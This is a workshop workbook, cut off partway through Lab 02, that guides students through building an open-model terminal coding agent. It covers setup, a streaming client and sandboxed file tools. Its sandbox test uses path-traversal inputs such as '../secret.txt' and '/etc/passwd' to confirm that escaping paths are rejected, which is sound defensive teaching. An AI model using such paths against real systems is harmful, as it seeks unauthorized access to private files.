# Student workbook · Forja: build your own coding agent

> A 2-day workshop. By the end you'll have **your own terminal coding agent** —like the commercial ones— running on open models on your machine, and you'll understand every piece because you wrote it.


## How to use this workbook
- Each lab: **goal → concepts → what you implement → run → checkpoint → challenges**.
- The code to complete is in `forja/` (look for `TODO NN.x`). Each lab's tests are in `tests/test_lNN_*.py`: `python scripts/tasks.py test NN`.
- When a lab's tests pass, the capability lights up in your CLI (`forja`). Pending labs appear as notes.
- Fallen behind? `python scripts/tasks.py catchup NN` copies the solutions of earlier labs (backing up yours).
- Practice project: `playground/` (a mini invoicing library with deliberate bugs). To reset it: `python scripts/tasks.py reset`.

## Map
| Day | Lab | Topic | What your agent gains |
|---|---|---|---|
| 1 | 00 | Setup and first contact | — |
| 1 | 01 | Streaming LLM client | streaming chat |
| 1 | 02 | File tools | read, search and edit |
| 1 | 03 | The agent loop | act in a loop |
| 1 | 04 | Bash and permissions | run commands with permissions |
| 1 | 05 | The CLI: your terminal agent | full interface |
| 2 | 06 | Context engineering | knows your project |
| 2 | 07 | Context management and compaction | long sessions |
| 2 | 08 | Plan before acting | plans |
| 2 | 09 | Subagents | delegates |
| 2 | 10 | Extensibility: hooks, skills and MCP | hooks, skills, MCP |
| 2 | 11 | Sessions and undo | resume and undo |
| 2 | 12 | Evals: measure your agent | is measured |

---

## Lab 00 · Setup and first contact

*Day 1 · 09:00–09:30*

**Goal:** Have Ollama running a tool-capable model, the repo installed and the tests running.

### Concepts
- **What we will build:** *Forja*, a terminal coding agent like the commercial ones: it reads and edits your project, runs commands, asks for permission, plans, delegates to subagents and is extended with hooks, skills and MCP. It runs on open models on your machine.
- **Agent = model + tools + loop. Harness = everything else** (permissions, context, UI, sessions…). The model is a swappable part: the harness is what we build.
- **How the labs work:** each lab has `TODO` functions in `forja/` and tests in `tests/`. When the tests pass, the capability lights up in your CLI. Falling behind? `python scripts/tasks.py catchup NN`.
- **Models:** `qwen3:8b` (16 GB laptop), `qwen3-coder:30b` (32 GB Mac or 24 GB GPU), or the room's shared server. OpenRouter with open-weight models only.

### What you implement
This lab has no TODOs.

### Before you start
- You need **Python 3.11+**, **git** and **Ollama** installed (or the address of the room's shared server). Check with `python --version` (macOS/Linux: `python3 --version`), `git --version` and `ollama --version`.
- Everything is run **from the repo root** through `python scripts/tasks.py …` so the same commands work on Windows (PowerShell/cmd) and macOS/Linux, without `make`.
- Map of the repo: `forja/` = YOUR code (stub functions raising `NotImplementedError("TODO NN.x")` with a hint comment above), `tests/test_lNN_*.py` = offline tests per lab (they use `forja/fake_llm.py`, no model needed), `playground/` = small invoices project with 3 bugs that your agent will fix, `labs/LNN_*/` = lab sheets.
- Forja is **progressive**: `forja/harness.py` catches `NotImplementedError` and keeps running without the missing piece, printing a note like `· tools: lab 02 pending — running without this capability`. Every lab you finish lights up a capability in the CLI.

### Setup step by step
1. **Open a terminal at the repo root** (the folder with `pyproject.toml`).
  - Windows PowerShell: `cd C:\path\to\forja-workshop`
  - macOS/Linux: `cd ~/path/to/forja-workshop`
  - Expected: `dir` / `ls` shows `forja`, `tests`, `playground`, `scripts`, `pyproject.toml`.
2. **Create and activate a virtualenv.**
  - Windows PowerShell: `python -m venv .venv` then `.venv\Scripts\Activate.ps1`
    (if you get *"running scripts is disabled on this system"*: `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned`, then activate again).
  - Windows cmd.exe: `python -m venv .venv` then `.venv\Scripts\activate.bat`
  - macOS/Linux: `python3 -m venv .venv` then `source .venv/bin/activate`
  - Expected: your prompt starts with `(.venv)` and `python --version` prints 3.11 or newer. From now on `python` (not `python3`) is the venv interpreter on every OS.
3. **Install Forja and create `.env`:** `python scripts/tasks.py setup` (same on every OS).
  - Expected: a first line `» …python -m pip install -e .[dev]`, pip output ending in `Successfully installed … forja-1.0.0 …`, and `created .env (review it)` the first time.
  - Check: `forja --help` prints `usage: forja [-h] [-p PROMPT] [--mode …]`.
4. **Choose your backend in `.env`** (open it with any editor).
  - 16 GB laptop: `FORJA_BACKEND=ollama`, `FORJA_MODEL=qwen3:8b` (the default).
  - 32 GB Mac / 24 GB GPU: `FORJA_MODEL=qwen3-coder:30b`.
  - Shared room server: uncomment the `openai_compat` block and set `FORJA_BASE_URL` / `FORJA_MODEL` from the tutor.
  - OpenRouter: open-weight models only — `anthropic/*`, `openai/*`, `gpt-oss`, `o3`… are blocked in `forja/config.py` (`ModelPolicyError`).
5. **Download and try the model** (skip if you use the shared server).
  - Every OS: `ollama pull qwen3:8b` → progress bars, then `success`.
  - `ollama run qwen3:8b "hello"` → a short greeting (qwen3 may print a *Thinking…* section first).
  - While it answers, in another terminal: `ollama ps` → a row with `qwen3:8b`, its SIZE and PROCESSOR (`100% GPU`, or a CPU/GPU split, which is slower).
6. **Check that the model can call tools:** `forja doctor` (it talks to the backend with the `openai` SDK directly, so it works before lab 01).
  - Expected:
    ```
    backend=ollama url=http://localhost:11434/v1 model=qwen3:8b
    answered in 4.2s · ~35 tok/s (includes loading)
    ✔ the model calls tools (ping)
    ```
  - `! the model answered without calling the tool` → the model doesn't do tool calling: pick another one. `✘ could not talk to the model` → Ollama isn't running or the URL in `.env` is wrong.
7. **Run the workshop tests:** `python scripts/tasks.py test`.
  - Expected: almost all red — around `58 failed, 7 passed`, each failure ending in `NotImplementedError: TODO NN.x`. That is correct: those are your TODOs.
  - One lab only: `python scripts/tasks.py test 01` → `9 failed, 5 passed` (the 5 green ones test provided code).
8. **Run the practice project's tests** (the work for your agent):
  - Windows PowerShell: `cd playground; python -m pytest -q; cd ..`
  - macOS/Linux: `cd playground && python -m pytest -q; cd ..`
  - Expected: `3 failed, 4 passed` — `test_round_half_up`, `test_total_with_vat_cent` and `test_due_date_sunday_moves_to_monday`. Don't fix them by hand: Forja will.
9. **Open the CLI once:** `forja --cwd playground`.
  - Expected: a cyan banner `Forja 1.0.0 · qwen3:8b · mode default`, the path, and `/help for commands`.
  - Type `hello` → `NotImplementedError: TODO 01.3` in red, plus dim `· … lab NN pending` notes. Correct for now: the streaming client is lab 01. Leave with `/exit` or Ctrl+D (Windows: Ctrl+Z, Enter).

### Run
```bash
python -m venv .venv
.venv\Scripts\activate            # Windows   (Linux/macOS: source .venv/bin/activate)
python scripts/tasks.py setup      # installs and creates .env
ollama pull qwen3:8b               # or the model for your hardware tier
python scripts/tasks.py test       # almost everything red: that's expected
cd playground && python -m pytest -q   # 3 tests fail: work for your agent
```

### Try it in your agent
1. Watch the tutor run `python scripts/tasks.py demo`: the reference agent on `playground/`. That is your agent at the end of day 2.
2. Run `ollama ps` while `ollama run qwen3:8b "write a haiku"` is answering: note GPU vs CPU and the memory used.
3. Skim `forja/harness.py`, method `Forja.gate`: every tool call goes parse → PreToolUse hook → permissions → approval → execute → PostToolUse hook. Each step is a lab.
4. Open `forja/llm.py` and find the first `# TODO 01.1:` comment: this is what a starter stub looks like.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| PowerShell: `Activate.ps1 cannot be loaded because running scripts is disabled` | Execution policy → `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned`, or use cmd.exe with `.venv\Scripts\activate.bat`. |
| `forja` is not recognized / `command not found: forja` | The venv isn't active or `setup` failed → activate it and re-run `python scripts/tasks.py setup`. `python -m forja` works as a fallback. |
| `ERROR: Package 'forja' requires a different Python` | Your Python is older than 3.11 → install 3.11+ and recreate `.venv` with it (Windows: `py -3.12 -m venv .venv`). |
| `forja doctor` → `✘ could not talk to the model: APIConnectionError` | Ollama is not running or `OLLAMA_BASE_URL` is wrong → start the Ollama app (or `ollama serve`) and check `http://localhost:11434` in a browser says *Ollama is running*. |
| `forja doctor` → `ModelPolicyError: model '…' blocked by policy` | You chose a closed model id (anthropic/openai/gpt-oss/o3…) → use an open-weight model. |
| `forja doctor` is very slow the first time (30–90 s) | The model is being loaded into memory → normal; the second call is fast. If it stays slow, `ollama ps` probably shows CPU: use a smaller model or the shared server. |
| macOS: `python: command not found` | Outside the venv macOS only has `python3` → create the venv with `python3 -m venv .venv`; once it is active, `python` works. |

### You're done when
- [ ] [ ] `ollama run <your model> "hello"` answers (or the shared server answers `forja doctor`).
- [ ] [ ] `forja doctor` prints `✔ the model calls tools`.
- [ ] [ ] `python scripts/tasks.py test` runs and shows red `NotImplementedError: TODO …` failures.
- [ ] [ ] `playground` tests show exactly 3 failures.

### Checkpoint
`ollama run qwen3:8b "hello"` answers and `python scripts/tasks.py test` runs (red, as it should). The tutor shows `python scripts/tasks.py demo`: that is what your agent will look like at the end of day 2.

### Challenges
1. Run `ollama ps` while the model answers: GPU or CPU? How much memory?
2. Skim `forja/harness.py`: find the “gate” every tool call goes through.


---

## Lab 01 · Streaming LLM client

*Day 1 · 09:30–10:15*

**Goal:** Talk to any OpenAI-compatible backend in streaming mode and rebuild tool calls that arrive in pieces.

### Concepts
- **One protocol, many backends:** Ollama, vLLM, LM Studio, llama.cpp and OpenRouter all speak Chat Completions. The `openai` SDK is just an HTTP client; the model is open.
- **Streaming:** text arrives token by token (the CLI feels alive). **Tool calls arrive in pieces too**: `index`, then `id` and `name`, then the argument JSON in fragments, sometimes interleaved across calls.
- **Local-model quirks:** `<think>…</think>` blocks that may be split across chunks; tool calls written as text `<tool_call>{…}</tool_call>`.
- **Retries:** only transient errors (connection, 429, 5xx) with exponential backoff. A 400 isn't fixed by retrying.

### What you implement
| TODO | File | What |
|---|---|---|
| 01.1 | `forja/llm.py` | ToolCallAccumulator: concatenate fragments by index |
| 01.2 | `forja/llm.py` | ThinkFilter: strip <think> even when the tag is split |
| 01.3 | `forja/llm.py` | LLMClient.stream: retries, TextDelta and Done events |

### Before you start
- Open `forja/llm.py` (your three TODOs), `forja/types.py` (`ToolCall`, `ChatResponse`, `TextDelta`, `Done` — provided) and `tests/test_l01_llm.py`.
- The `openai` SDK is only an HTTP client here. With `stream=True`, `client.chat.completions.create(**params)` returns an iterator of *chunks*. Each chunk has `.model`, `.usage` (usually only on the LAST chunk, which has `choices == []`) and `.choices[0].delta` with `.content` (a text piece or `None`) and `.tool_calls` (a list of fragments or `None`). `.choices[0].finish_reason` is set on the last content chunk.
- A tool-call fragment has `.index` (which call), `.id` and `.function.name` (usually only in the first fragment) and `.function.arguments` (a *piece* of a JSON string). The test fakes them with class `D`.
- How it connects: `LLMClient.stream()` is the generator the agent loop (lab 03) consumes. It yields `TextDelta(text)` for the UI while streaming and ends with ONE `Done(ChatResponse(...))` with everything assembled. `chat()` (provided) just returns the `Done` response.
- Provided helpers you will reuse: `self._params(messages, tools, **kw)` (builds the request body, including `stream`, `stream_options`, `tools`, `tool_choice` and `extra_body`), `RETRYABLE` (the transient exception classes) and `rescue_text_tool_calls(text)`.

### Step by step
Do 01.1 (accumulator) first: it is small, pure and tested in isolation. Then 01.2 (think filter), also pure but trickier — draw the buffer states on paper. Finish with 01.3, which wires both into the real stream; its tests use an `httpx.MockTransport`, so you still need no model. Run each TODO's test command before moving on.

#### TODO 01.1 · `forja/llm.py` · `ToolCallAccumulator.add(deltas)` / `ToolCallAccumulator.finish()`

**What it must do:** `add(deltas: list | None) -> None` receives ONE chunk's `delta.tool_calls` (may be `None`) and updates `self._parts: dict[int, dict[str, str]]`, one slot per `index` with keys `'id'`, `'name'`, `'arguments'`. `finish() -> list[ToolCall]` returns the complete calls ordered by index, skipping slots without a name; a missing id is replaced by a generated non-empty one, and empty arguments become `'{}'`. `arguments` stays a raw JSON **string**.

**Steps:**
1. In `add`, treat `None` as an empty list (the test calls `acc.add(None)`).
2. For each fragment, get (or create) the slot for `d.index` with empty strings.
3. If the fragment has an `id`, store it (don't overwrite a stored id with `None`).
4. If `d.function` is not `None`: CONCATENATE `name` and `arguments` onto the slot when present.
5. In `finish`, walk the indices in sorted order, skip slots whose name is empty, and build `ToolCall(id or generated, name, arguments or '{}')`.

**Watch out for:**
- Fragments of different calls arrive interleaved (`test_accumulator_interleaved`): index 0, then 1, then 0 and 1 again in the same list. Key by `index`, never by arrival order.
- `function.arguments` can be `''` or `None`; `'' + None` raises `TypeError` — check before adding.
- Don't `json.loads` the arguments here: `ToolCall.arguments` is the raw string; validation happens in lab 02.
- `test_accumulator_empty_args_and_missing_id` checks `c.arguments == "{}"` and that `c.id` is truthy (e.g. `f"call_{uuid.uuid4().hex[:8]}"` — `uuid` is already imported).

<details><summary>💡 Hint 1</summary>

`dict.setdefault(key, default)` returns the existing value or inserts and returns the default — perfect for “get or create the slot”.

</details>

<details><summary>💡 Hint 2</summary>

Everything is string concatenation with `+=`. The only special cases are `None` values and the empty name in `finish`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
def add(self, deltas):
    for d in deltas or []:
        slot = ...  # setdefault by d.index
        # id: store if present
        # function: += name, += arguments (if present)

def finish(self):
    out = []
    for i in sorted(self._parts):
        ...  # skip nameless, build ToolCall
    return out
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l01_llm.py -k accumulator -v
```

#### TODO 01.2 · `forja/llm.py` · `ThinkFilter.feed(text)` (`flush()` is provided)

**What it must do:** `feed(text: str) -> str` returns the VISIBLE text that can be printed now. State lives in `self.buf` (text not decided yet) and `self.in_think` (inside a `<think>` block). Text inside `<think>…</think>` is dropped; anything that might be the start of a tag split across chunks is held in `buf` until the next call. `flush()` (provided) returns what is left in `buf` if we are not inside a think block. Tests: `"".join(feed(c) for c in chunks) + flush()` with newlines removed must equal `"Hello"`, and `"a < b"` must pass through untouched.

**Steps:**
1. Append the new text to `self.buf`, prepare an output list, and loop while `buf` is not empty.
2. Outside a think block: look for `"<think>"` in `buf`. If found, emit everything before it, cut `buf` after the tag, set `in_think = True` and continue the loop.
3. Outside and NOT found: check whether the END of `buf` is a prefix of `"<think>"` (`"<"`, `"<t"`, …, `"<think"`). If so, emit everything except that suffix, keep the suffix in `buf` and return. Otherwise emit all of `buf`, empty it.
4. Inside a think block: look for `"</think>"`. If found, drop everything up to and including it (optionally strip leading `\n`), set `in_think = False`, continue the loop.
5. Inside and NOT found: discard the buffer but keep its last `len("</think>") - 1` characters (a closing tag may be starting) and return what you have emitted.
6. Return the joined output.

**Watch out for:**
- Case `["<thi", "nk>reasoning</th", "ink>Hel", "lo"]`: both tags are split. If you emit `"<thi"` immediately, the test fails.
- Case `["Hel", "lo<", "think>x</think>"]`: you must hold back only the `"<"`, still emitting `"lo"`.
- `test_think_filter_keeps_normal_lt`: `"a < b"` — the suffix `"b"` is not a tag prefix, so nothing is held. Only hold a suffix that `"<think>".startswith(...)`.
- One chunk may contain a whole block plus text after it: use a `while` loop, not a single `if`.
- Check the longest possible suffix first (6 chars down to 1), and never more than `len(buf)`.

<details><summary>💡 Hint 1</summary>

Think of it as a two-state machine (outside / inside) with a buffer of undecided characters.

</details>

<details><summary>💡 Hint 2</summary>

`str.find` returns `-1` when not found. `"<think>".startswith(self.buf[-k:])` tells you whether the last `k` characters could be the start of the tag.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
self.buf += text
out = []
while self.buf:
    if self.in_think:
        end = self.buf.find("</think>")
        if end == -1:
            ...  # keep last 7 chars, return
        ...  # cut after the tag, in_think = False
    else:
        start = self.buf.find("<think>")
        if start == -1:
            ...  # hold back a tag prefix at the end, or emit all
        ...  # emit before tag, cut, in_think = True
return "".join(out)
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l01_llm.py -k think_filter -v
```

#### TODO 01.3 · `forja/llm.py` · `LLMClient.stream(messages, tools=None, **kw)`

**What it must do:** A **generator** yielding `StreamEvent`s: zero or more `TextDelta(text)` (visible text only, after `ThinkFilter`) and exactly one final `Done(ChatResponse(content or None, tool_calls, usage, model, finish_reason))`. Retries only exceptions in `RETRYABLE`, at most `self.max_retries` extra attempts, waiting 1, 2, 4… seconds with `time.sleep`. `usage` must be exactly `{"prompt_tokens": …, "completion_tokens": …}`. If no native tool calls arrived, try `rescue_text_tool_calls(content)`. `finish_reason` is `"tool_calls"` when there are calls, otherwise the last one seen.

**Steps:**
1. Build `params = self._params(messages, tools, **kw)`.
2. Retry loop: `for attempt in range(self.max_retries + 1)`, call `self._client.chat.completions.create(**params)`; on success `break`; on a `RETRYABLE` exception re-raise if it was the last attempt, else `time.sleep(delay)` and double `delay` (start at 1).
3. Create a `ToolCallAccumulator`, a `ThinkFilter`, a list for the text, and defaults for usage, finish reason and model (`self.model`).
4. For each chunk: read `usage` (if present) and `model` (if present) FIRST; then skip chunks without `choices`; then take `choices[0]`, remember `finish_reason`, pass `delta.content` through the think filter and `yield TextDelta(...)` if anything is visible; pass `delta.tool_calls` to the accumulator.
5. After the loop: `flush()` the filter (yield its tail too), join the text, `finish()` the accumulator; if there are no calls, use `rescue_text_tool_calls`.
6. `yield Done(ChatResponse(...))`.

**Watch out for:**
- The usage chunk has `choices == []`: if you `continue` before reading `usage`, `test_stream_text_and_tool_calls` fails on `r.usage`.
- Copy only `prompt_tokens` and `completion_tokens` (the server also sends `total_tokens`; the test compares the whole dict).
- Call `time.sleep(...)` through the module (`import time` is there). The tests monkeypatch `"time.sleep"`; `from time import sleep` would really sleep.
- `test_retries_on_503` expects exactly 3 requests with `max_retries=2`. `test_no_retry_on_400` expects exactly 1: a 400 raises `openai.BadRequestError`, which is NOT in `RETRYABLE`, so let it propagate. (With the stub it fails as `assert 0 == 1`: the exception is raised but no request was made.)
- Don't add your own retries in the SDK: the client is created with `max_retries=0` on purpose.

<details><summary>💡 Hint 1</summary>

The function contains `yield`, so it is a generator: nothing runs (not even the request) until someone iterates it.

</details>

<details><summary>💡 Hint 2</summary>

`except RETRYABLE:` works because `RETRYABLE` is a tuple of exception classes. The text and the content of the final response are the same visible text (`"Looking…"` in the test).

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
params = self._params(messages, tools, **kw)
delay = 1.0
for attempt in range(self.max_retries + 1):
    try: chunks = ...; break
    except RETRYABLE: ...  # raise on last attempt, else sleep and double
acc, think = ToolCallAccumulator(), ThinkFilter()
for ch in chunks:
    ...  # usage/model, skip no choices, text, tool calls
...  # flush, finish, rescue
yield Done(ChatResponse(...))
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l01_llm.py -k "stream or retr" -v
```

### Run
```bash
python scripts/tasks.py test 01
forja doctor                      # does the model call tools?
forja                             # already a streaming chat (no tools yet)
```

### Try it in your agent
1. `python scripts/tasks.py test 01` → `14 passed`.
2. `forja --cwd playground` and ask `explain in 3 lines what an invoice due date is`. You should SEE the answer appear progressively (token by token) and then a dim `(1 steps · 0 tools)`. No `<think>` text should be printed.
3. Before the prompt you will see dim notes such as `· tools: lab 02 pending — running without this capability` and `· agent: lab 03 pending — chat mode without tools`: expected, it is a plain chat for now.
4. Check the retries: point to a dead port and watch it wait 1+2+4 s before failing.
  - PowerShell: `$env:OLLAMA_BASE_URL="http://localhost:9999/v1"; forja --cwd playground` (then `Remove-Item Env:OLLAMA_BASE_URL`)
  - macOS/Linux: `OLLAMA_BASE_URL=http://localhost:9999/v1 forja --cwd playground`
  - Type `hi` → after ~7 s, red `APIConnectionError: Connection error.`
5. `forja doctor` still prints `✔ the model calls tools` (it doesn't use your client, so it is your baseline when something looks wrong).

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `TypeError: can only concatenate str (not "NoneType") to str` in `add` | A fragment has `name` or `arguments` = `None` → only concatenate when the value is truthy. |
| Think-filter test fails with output like `<thiHello` or `Hel<` | You emitted a possible tag prefix instead of holding it in `self.buf` → hold back the longest suffix that `"<think>".startswith(...)`. |
| `test_think_filter_keeps_normal_lt` returns `"a "` or `""` | You hold back every `<` (or everything after it) → hold only a suffix that is a prefix of `<think>`; `flush()` returns the rest. |
| `test_retries_on_503` takes 3 seconds or more | You imported `sleep` directly → call `time.sleep(...)` so the monkeypatch applies. |
| `test_no_retry_on_400` fails with `assert 2 == 1` or `3 == 1` | You catch `Exception` (or `openai.APIStatusError`) in the retry loop → catch only `RETRYABLE`. |
| `AssertionError` on `r.usage == {...}` | Usage read after the `if not ch.choices: continue`, or `total_tokens` copied → read usage first, copy two keys. |
| In the CLI the answer appears all at once at the end | You collect the text and only yield `Done` → `yield TextDelta(visible)` inside the chunk loop. |
| In the CLI you see `<think>…` text | The content is not passed through `ThinkFilter.feed`, or `flush()` is called while `in_think` and returns the buffer → check both. (Some Ollama versions send reasoning in a separate field: then nothing appears, which is also fine.) |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 01` → all 14 tests green.
- [ ] [ ] `forja --cwd playground` answers in streaming without `<think>` text.
- [ ] [ ] You can explain why a 400 is not retried and a 503 is.

### Checkpoint
`forja doctor` shows ✔ and `forja` answers in streaming. “lab NN pending” notes are expected.

### Challenges
1. Measure local time-to-first-token against OpenRouter.
2. What if the model emits two tool calls with the same `index`? Can it happen?

**Tests:** `tests/test_l01_llm.py` · **Fallen behind?** `python scripts/tasks.py catchup 02`


---

## Lab 02 · File tools

*Day 1 · 10:15–11:15*

**Goal:** Give the agent eyes and hands on the project: read, search, create and edit files safely.

### Concepts
- **The schema is the prompt:** name, docstring and type hints generate the JSON Schema the model reads. A good description beats any system-prompt instruction.
- **Tools never raise:** every error goes back to the model as actionable text (“appears 3 times: add context”) so it can self-correct.
- **edit_file = exact replacement of a unique string.** The most robust format for small models (they produce bad diffs). Typical model mistakes: including `read_file` line numbers or changing indentation.
- **Read before edit** and detect external changes (mtime): the agent doesn't overwrite what it hasn't seen or what you just changed.
- **Sandbox:** every path resolves inside the workspace. `../` and outside absolute paths are rejected.
- **Explore without loading the repo:** `grep` and `glob` return paths and lines; the agent reads only what's relevant.

### What you implement
| TODO | File | What |
|---|---|---|
| 02.1 | `forja/tools.py` | Tool.schema: OpenAI-format JSON Schema |
| 02.2 | `forja/tools.py` | ToolRegistry.execute: run without ever raising |
| 02.3 | `forja/fs_tools.py` | Workspace.resolve: path sandbox |
| 02.4 | `forja/fs_tools.py` | write_file: create / overwrite with read-first |
| 02.5 | `forja/fs_tools.py` | edit_file: exact, unique replacement with useful errors |
| 02.6 | `forja/fs_tools.py` | grep: regex search across the workspace |

### Before you start
- Open `forja/tools.py` (TODOs 02.1–02.2), `forja/fs_tools.py` (02.3–02.6) and `tests/test_l02_tools.py`. Read the provided parts first: the `@tool` decorator builds a pydantic model from type hints + docstring (`Tool.args_model`), `ToolRegistry.parse_args(call)` validates JSON arguments, and `read_file` / `glob` are complete examples of tools.
- Stdlib/APIs you will use: pydantic `Model.model_json_schema()`; `json.dumps`; `time.perf_counter()`; `pathlib.Path.resolve()`, `.is_absolute()`, `.is_relative_to()`; `str.count`, `str.replace(old, new, 1)`; `re.compile`, `fnmatch.fnmatch`.
- Provided `Workspace` helpers you must use: `ws.resolve(path)` (your 02.3), `ws.rel(p)` (relative string), `ws.mark_read(p)` (remember mtime), `ws.check_fresh(p)` (raises `PermissionError` if not read or changed on disk), `ws.walk(base)` (files, skipping `.git`, `.venv`, `__pycache__`…), `ws.before_write` (callbacks, used by checkpoints in lab 11) and `unified_diff(before, after, path)`.
- Key idea: tools **raise** normal Python exceptions with helpful messages; `ToolRegistry.execute` (02.2) catches everything and returns the message to the model as `ToolResult(ok=False, …)`. So the test assertions like `"before modifying" in res.output` check YOUR error text passed through `execute`.
- How it connects: `schemas()` is what the model sees as `tools=[…]`; `execute` is called by the harness gate for every call the model makes.

### Step by step
02.1 → 02.2 → 02.3 first: every file-tool test goes through `registry.execute` and `ws.resolve`, so nothing else can pass before them. Then 02.4 (`write_file`), 02.5 (`edit_file`, the biggest one) and 02.6 (`grep`). Keep `read_file` open as your model of how a tool is written.

#### TODO 02.1 · `forja/tools.py` · `Tool.schema()`

**What it must do:** Returns `{"type": "function", "function": {"name": self.name, "description": self.description, "parameters": params}}` where `params` is the pydantic JSON Schema of `self.args_model` with: no `"title"` at the root, no `"title"` inside any property, `"additionalProperties": False`, and a `"properties"` key even for tools without arguments. `test_schema_from_type_hints` checks name, description `"Does something."`, `required == ["path"]`, `n` default `3`, `path` description `"Path."`.

**Steps:**
1. Get the schema dict from `self.args_model.model_json_schema()`.
2. Remove the root `title` (use `pop` with a default so it never fails).
3. Loop over the values of `params["properties"]` (may be missing) and remove each `title`.
4. Make sure `properties` exists and set `additionalProperties` to `False`.
5. Wrap it in the OpenAI function format and return.

**Watch out for:**
- pydantic adds titles like `"Path"`, `"N"` to each property: small models get confused by them, and the test asserts there is no root title.
- A tool with no parameters has no `properties` key: some backends reject a schema without it.
- Descriptions and `required` are already produced by pydantic from the `@tool` decorator: don't rebuild them by hand.

<details><summary>💡 Hint 1</summary>

Print it first: `python -c "from forja.fs_tools import *; from pathlib import Path; print(make_fs_tools(Workspace(Path('.')))[0].args_model.model_json_schema())"`.

</details>

<details><summary>💡 Hint 2</summary>

`dict.pop("title", None)` and `dict.setdefault("properties", {})` do most of the work.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
params = self.args_model.model_json_schema()
# drop root title
for prop in params.get("properties", {}).values():
    ...
# ensure properties, additionalProperties
return {"type": "function", "function": {...}}
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k schema -v
```

#### TODO 02.2 · `forja/tools.py` · `ToolRegistry.execute(call)`

**What it must do:** `execute(call: ToolCall) -> ToolResult` and it **never raises**. Uses `self.parse_args(call)` → `(tool, args, err)`; if `err`, return `ToolResult(call.id, call.name, False, err)`. Otherwise call `tool.fn(**args)`; any `Exception` becomes `ok=False` with output `"ERROR in '<tool>': <ExceptionType>: <message>"`. Success: a `ToolOutput` gives `.text` and `.meta`; a `str` is used as is; anything else is `json.dumps(..., ensure_ascii=False, default=str)`. Output always goes through `_truncate`; `duration_ms` is measured.

**Steps:**
1. Take `t0 = time.perf_counter()` at the start.
2. Call `self.parse_args(call)`; on error return a failed `ToolResult` with that message.
3. In a `try`, call the tool function with the validated args; on `Exception` return a failed result with type name and message.
4. Convert the return value to `(text, meta)` according to its type.
5. Return `ToolResult(call.id, call.name, ok, _truncate(text), meta, duration_ms)`.

**Watch out for:**
- When the tool doesn't exist, `parse_args` returns `t = None`: use `call.name`, not `t.name`, in the result (`test_execute_never_raises` calls a tool named `nope`).
- Include the exception MESSAGE in the output: later tests look for `"outside the workspace"`, `"before modifying"`, `"times"`, `"line numbers"`, `"has changed"` in `res.output`.
- Catch `Exception`, not bare `except:` (you don't want to swallow Ctrl+C / `KeyboardInterrupt`).
- A small helper closure `done(ok, out, meta=None)` avoids repeating the `ToolResult(...)` construction.

<details><summary>💡 Hint 1</summary>

The ordered field list of `ToolResult` is `call_id, name, ok, output, meta, duration_ms`.

</details>

<details><summary>💡 Hint 2</summary>

`isinstance(res, ToolOutput)` / `isinstance(res, str)`; the message format is `f"ERROR in '{t.name}': {type(e).__name__}: {e}"`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
t0 = time.perf_counter()
t, args, err = self.parse_args(call)
if err:
    return ...
try:
    res = t.fn(**args)
except Exception as e:
    return ...
# ToolOutput? str? other -> json
return ToolResult(..., _truncate(text), meta, int((time.perf_counter() - t0) * 1000))
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k execute_never_raises -v
```

#### TODO 02.3 · `forja/fs_tools.py` · `Workspace.resolve(path)`

**What it must do:** `resolve(path: str) -> Path`: a relative path is joined to `self.root`, an absolute one is kept; the result is `.resolve()`d (removes `..`, follows symlinks). If it is neither `self.root` nor inside it, raise `PermissionError(f"path outside the workspace: {path}")`. Returns the absolute resolved `Path`. `self.root` is already resolved in `__post_init__`.

**Steps:**
1. Wrap the string in a `Path`.
2. Build the candidate: the path itself if absolute, otherwise `self.root / path`.
3. Call `.resolve()` on the candidate.
4. If it equals `self.root` or `is_relative_to(self.root)`, return it; otherwise raise the `PermissionError`.

**Watch out for:**
- Check AFTER resolving: `"invoices/../../secret.txt"` looks relative but escapes.
- Don't compare strings with `startswith`: `/home/me/proj2` starts with `/home/me/proj`. `Path.is_relative_to` compares path components.
- `test_sandbox` checks both `"../secret.txt"` and `"/etc/passwd"` and that the message contains `"outside the workspace"` (on Windows `/etc/passwd` becomes `C:\etc\passwd`: still outside).

<details><summary>💡 Hint 1</summary>

Three lines of logic: build, resolve, check.

</details>

<details><summary>💡 Hint 2</summary>

`Path.is_absolute()`, `Path.resolve()`, `Path.is_relative_to(other)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
p = Path(path)
target = (...).resolve()
if target != self.root and not ...:
    raise PermissionError(...)
return target
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k "sandbox or read_numbered" -v
```

#### TODO 02.4 · `forja/fs_tools.py` · `make_fs_tools` → inner `write_file(path, content)`

**What it must do:** Returns `ToolOutput(text, {"path": ws.rel(p), "diff": unified_diff(before, content, ws.rel(p))})`. New file: creates parent folders and writes. Existing file: `ws.check_fresh(p)` first (raises `"read … with read_file before modifying it"`), keep the old content as `before`. Call every callback in `ws.before_write` with `p` before writing. After writing, `ws.mark_read(p)`. Text like `"docs/note.md created (1 lines)"` / `"… updated (N lines)"`. Write UTF-8.

**Steps:**
1. `p = ws.resolve(path)`; `before = ""`.
2. If `p` exists: `ws.check_fresh(p)` and read the old text into `before`.
3. Call each `cb(p)` in `ws.before_write`.
4. Create `p.parent` (parents, exist_ok) and write `content` with `encoding="utf-8"`.
5. `ws.mark_read(p)` and return the `ToolOutput` with path and diff.

**Watch out for:**
- `test_write_new_and_overwrite_rules` writes to `docs/note.md` — the `docs` folder doesn't exist yet.
- Overwriting a file that was never read must fail with `"before modifying"` in the output: let `check_fresh` raise, don't catch it.
